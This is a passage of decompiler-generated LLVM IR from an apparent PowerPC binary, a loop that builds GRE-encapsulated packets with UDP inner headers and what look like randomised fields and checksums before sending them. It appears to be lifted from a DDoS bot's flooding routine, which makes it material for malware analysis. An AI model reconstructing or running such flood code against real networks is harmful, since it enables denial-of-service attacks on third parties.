  %v2_1000272c = inttoptr i32 %v1_1000272c to i32*
  %v3_1000272c = load i32, i32* %v2_1000272c, align 4
  store i32 %v3_1000272c, i32* %r0.global-to-local, align 4
  %v1_10002730 = load i32, i32* %r30.global-to-local, align 4
  %v2_10002730 = add i32 %v1_10002730, 16
  %v3_10002730 = inttoptr i32 %v2_10002730 to i32*
  store i32 %v3_1000272c, i32* %v3_10002730, align 4
  br label %dec_label_pc_10002734

dec_label_pc_10002734:                            ; preds = %dec_label_pc_1000283c, %dec_label_pc_1000272c
  %v3_10002734 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002734, i32* %r9.global-to-local, align 4
  %v0_10002738 = load i32, i32* @r28, align 4
  %v1_10002738 = trunc i32 %v0_10002738 to i16
  %v2_10002738 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002738 = add i32 %v2_10002738, 4
  %v4_10002738 = inttoptr i32 %v3_10002738 to i16*
  store i16 %v1_10002738, i16* %v4_10002738, align 2
  %v0_1000273c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000273c = add i32 %v0_1000273c, 1
  store i32 %v1_1000273c, i32* %r31.global-to-local, align 4
  %v0_10002740 = load i32, i32* %r16.global-to-local, align 4
  %v1_10002740 = trunc i32 %v0_10002740 to i16
  %v2_10002740 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002740 = inttoptr i32 %v2_10002740 to i16*
  store i16 %v1_10002740, i16* %v3_10002740, align 2
  %v0_10002744 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002744 = load i32, i32* %r18.global-to-local, align 4
  %v2_10002744 = icmp slt i32 %v0_10002744, %v1_10002744
  %v4_10002744 = icmp eq i32 %v0_10002744, %v1_10002744
  store i1 %v4_10002744, i1* %cr7_eq.global-to-local, align 1
  %v0_10002748 = load i32, i32* %r17.global-to-local, align 4
  %v1_10002748 = trunc i32 %v0_10002748 to i16
  %v2_10002748 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002748 = add i32 %v2_10002748, 2
  %v4_10002748 = inttoptr i32 %v3_10002748 to i16*
  store i16 %v1_10002748, i16* %v4_10002748, align 2
  %v0_1000274c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1000274c, i32* %stack_var_-104, align 4
  br i1 %v2_10002744, label %dec_label_pc_10002754, label %dec_label_pc_100028b0

dec_label_pc_10002754:                            ; preds = %dec_label_pc_10002734, %dec_label_pc_100026f8
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268445536, i32* @lr, align 4
  %v2_1000275c = call i32 @function_10008ec0(i32 1510, i32 4)
  store i32 %v2_1000275c, i32* %r3.global-to-local, align 4
  %v3_10002760 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002760, i32* %r9.global-to-local, align 4
  %v0_10002764 = load i32, i32* @r31, align 4
  %v1_10002764 = mul i32 %v0_10002764, 4
  store i32 %v1_10002764, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r11.global-to-local, align 4
  %v1_1000276c = load i32, i32* %r19.global-to-local, align 4
  %v3_1000276c = add i32 %v1_1000276c, %v1_10002764
  %v4_1000276c = inttoptr i32 %v3_1000276c to i32*
  store i32 %v2_1000275c, i32* %v4_1000276c, align 4
  %v0_10002770 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002770 = mul i32 %v0_10002770, 4
  store i32 %v1_10002770, i32* %r9.global-to-local, align 4
  %v1_10002774 = load i32, i32* %r19.global-to-local, align 4
  %v2_10002774 = add i32 %v1_10002774, %v1_10002770
  %v3_10002774 = inttoptr i32 %v2_10002774 to i32*
  %v4_10002774 = load i32, i32* %v3_10002774, align 4
  store i32 %v4_10002774, i32* %r31.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_1000277c = inttoptr i32 %v4_10002774 to i32*
  %v2_1000277c = load i32, i32* %v1_1000277c, align 4
  store i32 %v2_1000277c, i32* %r0.global-to-local, align 4
  %v1_10002780 = add i32 %v4_10002774, 38
  store i32 %v1_10002780, i32* %r30.global-to-local, align 4
  %v0_10002784 = load i32, i32* %r20.global-to-local, align 4
  %v1_10002784 = trunc i32 %v0_10002784 to i8
  %v3_10002784 = add i32 %v4_10002774, 8
  %v4_10002784 = inttoptr i32 %v3_10002784 to i8*
  store i8 %v1_10002784, i8* %v4_10002784, align 1
  %v0_10002788 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002788 = add i32 %v0_10002788, 58
  store i32 %v1_10002788, i32* %r29.global-to-local, align 4
  %v1_1000278c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000278c, i32* %r0.global-to-local, align 4
  %v0_10002790 = load i32, i32* %r24.global-to-local, align 4
  %v1_10002790 = trunc i32 %v0_10002790 to i16
  %v2_10002790 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002790 = add i32 %v2_10002790, 4
  %v4_10002790 = inttoptr i32 %v3_10002790 to i16*
  store i16 %v1_10002790, i16* %v4_10002790, align 2
  %v1_10002794 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002794, i32* %r0.global-to-local, align 4
  %v0_10002798 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002798 = add i32 %v0_10002798, 20
  store i32 %v1_10002798, i32* %r9.global-to-local, align 4
  %v2_1000279c = inttoptr i32 %v0_10002798 to i32*
  store i32 %v1_10002794, i32* %v2_1000279c, align 4
  %v0_100027a0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100027a0 = add i32 %v0_100027a0, 24
  store i32 %v1_100027a0, i32* %r11.global-to-local, align 4
  %v0_100027a4 = load i32, i32* %r14.global-to-local, align 4
  %v1_100027a4 = trunc i32 %v0_100027a4 to i8
  %v3_100027a4 = add i32 %v0_100027a0, 1
  %v4_100027a4 = inttoptr i32 %v3_100027a4 to i8*
  store i8 %v1_100027a4, i8* %v4_100027a4, align 1
  %v0_100027a8 = load i32, i32* %r22.global-to-local, align 4
  %v1_100027a8 = trunc i32 %v0_100027a8 to i16
  %v2_100027a8 = load i32, i32* %r31.global-to-local, align 4
  %v3_100027a8 = add i32 %v2_100027a8, 2
  %v4_100027a8 = inttoptr i32 %v3_100027a8 to i16*
  store i16 %v1_100027a8, i16* %v4_100027a8, align 2
  %v0_100027ac = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100027ac, label %dec_label_pc_100027b8, label %dec_label_pc_100027b0

dec_label_pc_100027b0:                            ; preds = %dec_label_pc_10002754
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_100027b4 = load i32, i32* %r31.global-to-local, align 4
  %v3_100027b4 = add i32 %v2_100027b4, 6
  %v4_100027b4 = inttoptr i32 %v3_100027b4 to i16*
  store i16 16384, i16* %v4_100027b4, align 2
  br label %dec_label_pc_100027b8

dec_label_pc_100027b8:                            ; preds = %dec_label_pc_10002754, %dec_label_pc_100027b0
  %v2_100027bc = load i32, i32* %r31.global-to-local, align 4
  %v3_100027bc = add i32 %v2_100027bc, 9
  %v4_100027bc = inttoptr i32 %v3_100027bc to i8*
  store i8 47, i8* %v4_100027bc, align 1
  store i32 25944, i32* %r0.global-to-local, align 4
  %v2_100027c4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100027c4 = add i32 %v2_100027c4, 2
  %v4_100027c4 = inttoptr i32 %v3_100027c4 to i16*
  store i16 25944, i16* %v4_100027c4, align 2
  %v2_100027cc = load i32, i32* %r11.global-to-local, align 4
  %v3_100027cc = add i32 %v2_100027cc, 12
  %v4_100027cc = inttoptr i32 %v3_100027cc to i16*
  store i16 2048, i16* %v4_100027cc, align 2
  %v3_100027d0 = load i32, i32* %stack_var_-104, align 4
  store i32 %v5_10002690, i32* %r11.global-to-local, align 4
  %v1_100027d8 = mul i32 %v3_100027d0, 24
  store i32 %v1_100027d8, i32* %r9.global-to-local, align 4
  %v0_100027dc = load i32, i32* %r31.global-to-local, align 4
  %v1_100027dc = add i32 %v0_100027dc, 38
  %v2_100027dc = inttoptr i32 %v1_100027dc to i32*
  %v3_100027dc = load i32, i32* %v2_100027dc, align 4
  store i32 %v3_100027dc, i32* %r0.global-to-local, align 4
  %v2_100027e0 = add i32 %v0_100027dc, 12
  %v3_100027e0 = inttoptr i32 %v2_100027e0 to i32*
  store i32 %v5_10002690, i32* %v3_100027e0, align 4
  store i32 4, i32* %r11.global-to-local, align 4
  %v0_100027e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100027e8 = load i32, i32* %r25.global-to-local, align 4
  %v2_100027e8 = add i32 %v1_100027e8, %v0_100027e8
  store i32 %v2_100027e8, i32* %r9.global-to-local, align 4
  %v1_100027ec = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100027ec, i32* %r0.global-to-local, align 4
  %v0_100027f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100027f0 = add i32 %v0_100027f0, 16
  %v2_100027f0 = inttoptr i32 %v1_100027f0 to i32*
  %v3_100027f0 = load i32, i32* %v2_100027f0, align 4
  store i32 %v3_100027f0, i32* %r11.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_100027f8 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100027f8, i32* %r0.global-to-local, align 4
  %v1_100027fc = load i32, i32* %r31.global-to-local, align 4
  %v2_100027fc = add i32 %v1_100027fc, 38
  %v3_100027fc = inttoptr i32 %v2_100027fc to i32*
  store i32 %v1_100027f8, i32* %v3_100027fc, align 4
  %v0_10002800 = load i32, i32* %r11.global-to-local, align 4
  %v1_10002800 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002800 = add i32 %v1_10002800, 16
  %v3_10002800 = inttoptr i32 %v2_10002800 to i32*
  store i32 %v0_10002800, i32* %v3_10002800, align 4
  %v0_10002804 = load i32, i32* %r14.global-to-local, align 4
  %v1_10002804 = trunc i32 %v0_10002804 to i8
  %v2_10002804 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002804 = add i32 %v2_10002804, 1
  %v4_10002804 = inttoptr i32 %v3_10002804 to i8*
  store i8 %v1_10002804, i8* %v4_10002804, align 1
  %v0_10002808 = load i32, i32* %r26.global-to-local, align 4
  %v1_10002808 = trunc i32 %v0_10002808 to i16
  %v2_10002808 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002808 = add i32 %v2_10002808, 2
  %v4_10002808 = inttoptr i32 %v3_10002808 to i16*
  store i16 %v1_10002808, i16* %v4_10002808, align 2
  %v0_1000280c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000280c = trunc i32 %v0_1000280c to i16
  %v2_1000280c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000280c = add i32 %v2_1000280c, 4
  %v4_1000280c = inttoptr i32 %v3_1000280c to i16*
  store i16 %v1_1000280c, i16* %v4_1000280c, align 2
  %v0_10002810 = load i32, i32* %r20.global-to-local, align 4
  %v1_10002810 = trunc i32 %v0_10002810 to i8
  %v2_10002810 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002810 = add i32 %v2_10002810, 8
  %v4_10002810 = inttoptr i32 %v3_10002810 to i8*
  store i8 %v1_10002810, i8* %v4_10002810, align 1
  %v0_10002814 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002814, label %dec_label_pc_10002820, label %dec_label_pc_10002818

dec_label_pc_10002818:                            ; preds = %dec_label_pc_100027b8
  store i32 16384, i32* %r11.global-to-local, align 4
  %v2_1000281c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000281c = add i32 %v2_1000281c, 6
  %v4_1000281c = inttoptr i32 %v3_1000281c to i16*
  store i16 16384, i16* %v4_1000281c, align 2
  br label %dec_label_pc_10002820

dec_label_pc_10002820:                            ; preds = %dec_label_pc_100027b8, %dec_label_pc_10002818
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_10002824 = load i32, i32* %r30.global-to-local, align 4
  %v3_10002824 = add i32 %v2_10002824, 9
  %v4_10002824 = inttoptr i32 %v3_10002824 to i8*
  store i8 17, i8* %v4_10002824, align 1
  %v0_10002828 = call i32 @function_10006318()
  store i32 %v0_10002828, i32* %r3.global-to-local, align 4
  %v1_1000282c = add i32 %v0_10002828, -1024
  store i32 %v1_1000282c, i32* %r0.global-to-local, align 4
  %v1_10002830 = load i32, i32* %r30.global-to-local, align 4
  %v2_10002830 = add i32 %v1_10002830, 12
  %v3_10002830 = inttoptr i32 %v2_10002830 to i32*
  store i32 %v0_10002828, i32* %v3_10002830, align 4
  %v0_10002834 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002834 = sub i32 -1, %v0_10002834
  store i32 %v1_10002834, i32* %r0.global-to-local, align 4
  %v0_10002838 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002838, label %dec_label_pc_1000283c, label %dec_label_pc_1000272c

dec_label_pc_1000283c:                            ; preds = %dec_label_pc_10002820
  %v1_1000283c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000283c = add i32 %v1_1000283c, 16
  %v3_1000283c = inttoptr i32 %v2_1000283c to i32*
  store i32 %v1_10002834, i32* %v3_1000283c, align 4
  br label %dec_label_pc_10002734

dec_label_pc_10002844:                            ; preds = %dec_label_pc_100026b4
  %v0_10002844 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10002844, i32* %r3.global-to-local, align 4
  store i32 268445772, i32* @lr, align 4
  %v0_10002848 = call i32 @function_10007d68()
  store i32 %v0_10002848, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000284c

dec_label_pc_1000284c:                            ; preds = %dec_label_pc_10002520, %dec_label_pc_10002844
  store i32 %v0_10002538, i32* %r0.global-to-local, align 4
  %v1_10002860 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10002528)
  store i32 %v0_1000256c, i32* %r28.global-to-local, align 4
  store i32 %v0_10002574, i32* %r29.global-to-local, align 4
  store i32 %v0_1000257c, i32* %r30.global-to-local, align 4
  store i32 %v0_10002580, i32* %r31.global-to-local, align 4
  %v0_100028a8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100028a8

dec_label_pc_100028ac:                            ; preds = %dec_label_pc_100026d8
  %v3_100028ac = icmp eq i32 %v1_100026f0, 0
  store i1 %v3_100028ac, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_100028b0

dec_label_pc_100028b0:                            ; preds = %dec_label_pc_10002734, %dec_label_pc_100028ac
  store i32 %v5_10002690, i32* %r0.global-to-local, align 4
  %v0_100028b4 = load i32, i32* %r21.global-to-local, align 4
  %v3_100028b4 = icmp eq i32 %v0_100028b4, 0
  store i1 %v3_100028b4, i1* %cr2_eq.global-to-local, align 1
  %v2_100028b8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_100028b8, i32* %r14.global-to-local, align 4
  %v0_100028bc = load i32, i32* %r15.global-to-local, align 4
  %v1_100028bc = add i32 %v0_100028bc, 8
  store i32 %v1_100028bc, i32* %r21.global-to-local, align 4
  %v3_100028c0 = icmp eq i32 %v5_10002690, -1
  store i1 %v3_100028c0, i1* %cr7_eq.global-to-local, align 1
  %v1_100028c4 = add i32 %v0_100028bc, 66
  store i32 %v1_100028c4, i32* %r22.global-to-local, align 4
  %v0_100028c8 = call i32 @__asm_mfcr()
  store i32 %v0_100028c8, i32* %r3.global-to-local, align 4
  %v1_100028cc = mul i32 %v0_100028c8, 268435456
  store i32 %v1_100028cc, i32* %r20.global-to-local, align 4
  %v2_10002960 = ptrtoint i32* %stack_var_-100 to i32
  %v2_10002984 = ptrtoint i32* %stack_var_-92 to i32
  %v2_10002994 = ptrtoint i32* %stack_var_-90 to i32
  %v0_100028d0.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100028d0.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_100028d0.outer

dec_label_pc_100028d0.outer:                      ; preds = %dec_label_pc_10002a34, %dec_label_pc_100028b0
  %v1_100028d0.ph = phi i1 [ %v1_100028d0.pre, %dec_label_pc_100028b0 ], [ %v1_10002a34, %dec_label_pc_10002a34 ]
  %v0_100028d0.ph = phi i1 [ %v0_100028d0.pre, %dec_label_pc_100028b0 ], [ %v0_10002a34, %dec_label_pc_10002a34 ]
  %v2_100028d0 = or i1 %v1_100028d0.ph, %v0_100028d0.ph
  br label %dec_label_pc_100028d0

dec_label_pc_100028d0:                            ; preds = %dec_label_pc_100028d0.outer, %dec_label_pc_100028d0
  br i1 %v2_100028d0, label %dec_label_pc_100028d0, label %dec_label_pc_100028d4

dec_label_pc_100028d4:                            ; preds = %dec_label_pc_100028d0, %dec_label_pc_10002a34
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100028e4

dec_label_pc_100028e4:                            ; preds = %dec_label_pc_100029a4, %dec_label_pc_100028d4
  %v0_100028e4 = phi i32 [ %v1_10002a24, %dec_label_pc_100029a4 ], [ 0, %dec_label_pc_100028d4 ]
  %v1_100028e4 = mul i32 %v0_100028e4, 24
  store i32 %v1_100028e4, i32* %r0.global-to-local, align 4
  %v1_100028e8 = mul i32 %v0_100028e4, 4
  store i32 %v1_100028e8, i32* %r11.global-to-local, align 4
  %v1_100028ec = load i32, i32* %r19.global-to-local, align 4
  %v2_100028ec = add i32 %v1_100028ec, %v1_100028e8
  %v3_100028ec = inttoptr i32 %v2_100028ec to i32*
  %v4_100028ec = load i32, i32* %v3_100028ec, align 4
  store i32 %v4_100028ec, i32* %r28.global-to-local, align 4
  %v1_100028f0 = load i32, i32* %r25.global-to-local, align 4
  %v2_100028f0 = add i32 %v1_100028f0, %v1_100028e4
  %v1_100028f4 = add i32 %v2_100028f0, 20
  %v2_100028f4 = inttoptr i32 %v1_100028f4 to i8*
  %v3_100028f4 = load i8, i8* %v2_100028f4, align 1
  %v4_100028f4 = zext i8 %v3_100028f4 to i32
  store i32 %v4_100028f4, i32* %r9.global-to-local, align 4
  %v1_100028f8 = add i32 %v4_100028ec, 24
  store i32 %v1_100028f8, i32* @r30, align 4
  %v1_100028fc = add i32 %v4_100028ec, 38
  store i32 %v1_100028fc, i32* @r31, align 4
  %v1_10002900 = add i32 %v4_100028ec, 58
  store i32 %v1_10002900, i32* %r27.global-to-local, align 4
  %v3_10002904 = icmp eq i8 %v3_100028f4, 31
  store i1 %v3_10002904, i1* %cr7_eq.global-to-local, align 1
  %tmp39 = icmp ult i8 %v3_100028f4, 32
  br i1 %tmp39, label %dec_label_pc_10002a3c, label %dec_label_pc_1000290c

dec_label_pc_1000290c:                            ; preds = %dec_label_pc_100028e4
  %v0_1000290c = load i32, i32* %r20.global-to-local, align 4
  %v1_1000290c = mul i32 %v0_1000290c, 16
  %v2_1000290c = udiv i32 %v0_1000290c, 268435456
  %v3_1000290c = or i32 %v2_1000290c, %v1_1000290c
  store i32 %v3_1000290c, i32* %r20.global-to-local, align 4
  %v1_10002910 = call %0 @__asm_mtcrf(i32 1, i32 %v3_1000290c)
  %v1_10002914 = mul nuw i32 %v2_1000290c, 268435456
  %v2_10002914 = urem i32 %v0_1000290c, 268435456
  %v3_10002914 = or i32 %v1_10002914, %v2_10002914
  store i32 %v3_10002914, i32* %r20.global-to-local, align 4
  %v0_10002918 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002918, label %dec_label_pc_10002a70, label %dec_label_pc_1000291c

dec_label_pc_1000291c:                            ; preds = %dec_label_pc_10002a3c, %dec_label_pc_1000290c
  store i32 65535, i32* @r29, align 4
  %v0_10002924 = load i32, i32* %r24.global-to-local, align 4
  %v4_10002924 = icmp eq i32 %v0_10002924, 65535
  store i1 %v4_10002924, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002924, label %dec_label_pc_10002a88, label %dec_label_pc_1000292c

dec_label_pc_1000292c:                            ; preds = %dec_label_pc_10002a70, %dec_label_pc_1000291c
  %v1_1000292c = phi i32 [ %v1_10002a80, %dec_label_pc_10002a70 ], [ 65535, %dec_label_pc_1000291c ]
  %v0_1000292c = load i32, i32* %r16.global-to-local, align 4
  %v4_1000292c = icmp eq i32 %v0_1000292c, %v1_1000292c
  store i1 %v4_1000292c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000292c, label %dec_label_pc_10002aa8, label %dec_label_pc_10002934

dec_label_pc_10002934:                            ; preds = %dec_label_pc_10002a88.dec_label_pc_10002934_crit_edge, %dec_label_pc_1000292c
  %v1_10002934 = phi i32 [ %v1_10002934.pre, %dec_label_pc_10002a88.dec_label_pc_10002934_crit_edge ], [ %v1_1000292c, %dec_label_pc_1000292c ]
  %v0_10002934 = load i32, i32* %r17.global-to-local, align 4
  %v4_10002934 = icmp eq i32 %v0_10002934, %v1_10002934
  store i1 %v4_10002934, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002934, label %dec_label_pc_10002ab8, label %dec_label_pc_1000293c

dec_label_pc_1000293c:                            ; preds = %dec_label_pc_10002aa8, %dec_label_pc_10002934
  %v0_1000293c = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_1000293c, label %dec_label_pc_10002ac4, label %dec_label_pc_10002940

dec_label_pc_10002940:                            ; preds = %dec_label_pc_10002ab8, %dec_label_pc_1000293c
  %v0_10002940 = load i32, i32* %r28.global-to-local, align 4
  %v1_10002940 = add i32 %v0_10002940, 16
  %v2_10002940 = inttoptr i32 %v1_10002940 to i32*
  %v3_10002940 = load i32, i32* %v2_10002940, align 4
  store i32 %v3_10002940, i32* %r0.global-to-local, align 4
  %v1_10002944 = load i32, i32* @r31, align 4
  %v2_10002944 = add i32 %v1_10002944, 16
  %v3_10002944 = inttoptr i32 %v2_10002944 to i32*
  store i32 %v3_10002940, i32* %v3_10002944, align 4
  br label %dec_label_pc_10002948

dec_label_pc_10002948:                            ; preds = %dec_label_pc_10002ac4, %dec_label_pc_10002940
  %v0_10002948 = call i32 @function_10006318()
  store i32 %v0_10002948, i32* %r3.global-to-local, align 4
  store i32 %v0_10002948, i32* %stack_var_-100, align 4
  %v0_10002950 = call i32 @function_10006318()
  store i32 %v0_10002950, i32* %r3.global-to-local, align 4
  store i32 %v0_10002950, i32* %stack_var_-96, align 4
  %v0_10002958 = call i32 @function_10006318()
  store i32 %v0_10002958, i32* %stack_var_-92, align 4
  %v0_10002964 = load i32, i32* @r30, align 4
  store i32 %v0_10002964, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002970.64 to i32), i32* @lr, align 4
  %v3_1000296c = call i32 @function_10007560(i32 %v0_10002964, i32 %v2_10002960, i32 4)
  %v0_10002970 = load i32, i32* @r30, align 4
  %v1_10002970 = add i32 %v0_10002970, 6
  store i32 %v1_10002970, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002980.65 to i32), i32* @lr, align 4
  %v3_1000297c = call i32 @function_10007560(i32 %v1_10002970, i32 %v2_100028b8, i32 4)
  %v0_10002980 = load i32, i32* @r30, align 4
  %v1_10002980 = add i32 %v0_10002980, 4
  store i32 %v1_10002980, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002990.66 to i32), i32* @lr, align 4
  %v3_1000298c = call i32 @function_10007560(i32 %v1_10002980, i32 %v2_10002984, i32 2)
  %v0_10002990 = load i32, i32* @r30, align 4
  %v1_10002990 = add i32 %v0_10002990, 10
  store i32 %v1_10002990, i32* %r3.global-to-local, align 4
  store i32 268446112, i32* @lr, align 4
  %v3_1000299c = call i32 @function_10007560(i32 %v1_10002990, i32 %v2_10002994, i32 2)
  store i32 %v3_1000299c, i32* %r3.global-to-local, align 4
  %v0_100029a0 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100029a0, label %dec_label_pc_100029a4, label %dec_label_pc_10002ad0

dec_label_pc_100029a4:                            ; preds = %dec_label_pc_10002948, %dec_label_pc_10002ad0
  %v0_100029a4 = load i32, i32* %r26.global-to-local, align 4
  %v1_100029a4 = trunc i32 %v0_100029a4 to i16
  %v2_100029a4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100029a4 = add i32 %v2_100029a4, 10
  %v4_100029a4 = inttoptr i32 %v3_100029a4 to i16*
  store i16 %v1_100029a4, i16* %v4_100029a4, align 2
  %v0_100029ac = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100029ac, i32* @r3, align 4
  %v2_100029b0 = call i32 @function_1000491c(i32 %v0_100029ac, i32 20)
  %v3_100029b0 = trunc i32 %v2_100029b0 to i16
  %v4_100029b8 = add i32 %v0_100029ac, 10
  %v5_100029b8 = inttoptr i32 %v4_100029b8 to i16*
  store i16 %v3_100029b0, i16* %v5_100029b8, align 2
  %v0_100029bc = load i32, i32* @r31, align 4
  store i32 %v0_100029bc, i32* @r3, align 4
  %v0_100029c0 = load i32, i32* %r26.global-to-local, align 4
  %v1_100029c0 = trunc i32 %v0_100029c0 to i16
  %v3_100029c0 = add i32 %v0_100029bc, 10
  %v4_100029c0 = inttoptr i32 %v3_100029c0 to i16*
  store i16 %v1_100029c0, i16* %v4_100029c0, align 2
  %v2_100029c4 = call i32 @function_1000491c(i32 %v0_100029bc, i32 20)
  %v3_100029c4 = trunc i32 %v2_100029c4 to i16
  %v0_100029c8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100029c8, i32* @r4, align 4
  %v3_100029cc = load i32, i32* @r31, align 4
  %v4_100029cc = add i32 %v3_100029cc, 10
  %v5_100029cc = inttoptr i32 %v4_100029cc to i16*
  store i16 %v3_100029c4, i16* %v5_100029cc, align 2
  %v0_100029d0 = load i32, i32* %r21.global-to-local, align 4
  %v0_100029d4 = load i32, i32* %r26.global-to-local, align 4
  %v1_100029d4 = trunc i32 %v0_100029d4 to i16
  %v2_100029d4 = load i32, i32* %r27.global-to-local, align 4
  %v3_100029d4 = add i32 %v2_100029d4, 6
  %v4_100029d4 = inttoptr i32 %v3_100029d4 to i16*
  store i16 %v1_100029d4, i16* %v4_100029d4, align 2
  %v0_100029d8 = load i32, i32* @r31, align 4
  store i32 %v0_100029d8, i32* %r3.global-to-local, align 4
  %v0_100029dc = load i32, i32* %r27.global-to-local, align 4
  %v1_100029dc = add i32 %v0_100029dc, 4
  %v2_100029dc = inttoptr i32 %v1_100029dc to i16*
  %v3_100029dc = load i16, i16* %v2_100029dc, align 2
  %v4_100029dc = zext i16 %v3_100029dc to i32
  %v4_100029e0 = call i32 @function_10004980(i32 %v0_100029d8, i32 %v0_100029c8, i32 %v4_100029dc, i32 %v0_100029d0)
  %v5_100029e0 = trunc i32 %v4_100029e0 to i16
  store i32 %v4_100029e0, i32* %r3.global-to-local, align 4
  %v3_100029e4 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_100029e4, i32* %r0.global-to-local, align 4
  %v0_100029e8 = load i32, i32* %r28.global-to-local, align 4
  %v1_100029e8 = add i32 %v0_100029e8, 16
  %v2_100029e8 = inttoptr i32 %v1_100029e8 to i32*
  %v3_100029e8 = load i32, i32* %v2_100029e8, align 4
  store i32 %v3_100029e8, i32* %r11.global-to-local, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_100029f0 = mul i32 %v3_100029e4, 24
  store i32 %v1_100029f0, i32* %r0.global-to-local, align 4
  %v3_100029f4 = load i32, i32* %r27.global-to-local, align 4
  %v4_100029f4 = add i32 %v3_100029f4, 6
  %v5_100029f4 = inttoptr i32 %v4_100029f4 to i16*
  store i16 %v5_100029e0, i16* %v5_100029f4, align 2
  %v0_100029f8 = load i32, i32* %r28.global-to-local, align 4
  %v0_100029fc = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100029fc, i32* %r3.global-to-local, align 4
  %v0_10002a00 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002a00 = load i32, i32* %r25.global-to-local, align 4
  %v2_10002a00 = add i32 %v1_10002a00, %v0_10002a00
  %v0_10002a04 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002a04 = trunc i32 %v0_10002a04 to i16
  %v5_10002a04 = inttoptr i32 %v2_10002a00 to i16*
  store i16 %v3_10002a04, i16* %v5_10002a04, align 2
  %v0_10002a08 = load i32, i32* %r11.global-to-local, align 4
  %v2_10002a08 = add i32 %v2_10002a00, 4
  %v3_10002a08 = inttoptr i32 %v2_10002a08 to i32*
  store i32 %v0_10002a08, i32* %v3_10002a08, align 4
  %v0_10002a0c = load i32, i32* %r22.global-to-local, align 4
  %v0_10002a10 = load i32, i32* %r26.global-to-local, align 4
  %v1_10002a10 = trunc i32 %v0_10002a10 to i16
  %v3_10002a10 = add i32 %v2_10002a00, 2
  %v4_10002a10 = inttoptr i32 %v3_10002a10 to i16*
  store i16 %v1_10002a10, i16* %v4_10002a10, align 2
  store i32 268446240, i32* @lr, align 4
  %v6_10002a1c = call i32 @function_10008ab8(i32 %v0_100029fc, i32 %v0_100029f8, i32 %v0_10002a0c, i32 16384, i32 %v2_10002a00, i32 16)
  store i32 %v6_10002a1c, i32* %r3.global-to-local, align 4
  %v3_10002a20 = load i32, i32* %stack_var_-104, align 4
  %v1_10002a24 = add i32 %v3_10002a20, 1
  store i32 %v1_10002a24, i32* %r9.global-to-local, align 4
  %v1_10002a28 = load i32, i32* %r18.global-to-local, align 4
  %v2_10002a28 = icmp slt i32 %v1_10002a24, %v1_10002a28
  %v4_10002a28 = icmp eq i32 %v1_10002a24, %v1_10002a28
  store i1 %v4_10002a28, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10002a24, i32* %stack_var_-104, align 4
  br i1 %v2_10002a28, label %dec_label_pc_100028e4, label %dec_label_pc_10002a34

